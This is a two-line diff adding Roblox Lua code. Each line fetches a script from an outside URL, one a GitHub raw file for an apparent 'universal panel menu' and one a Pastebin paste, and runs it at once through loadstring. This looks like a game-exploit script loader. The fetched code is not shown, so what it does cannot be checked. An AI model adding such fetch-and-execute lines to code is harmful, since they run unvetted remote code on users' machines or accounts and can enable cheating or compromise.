@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/realEXXTEAM/panelmenuuniversal/refs/heads/main/PanelMenu.EXXTEAM"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/p7FgA3Vs"))()
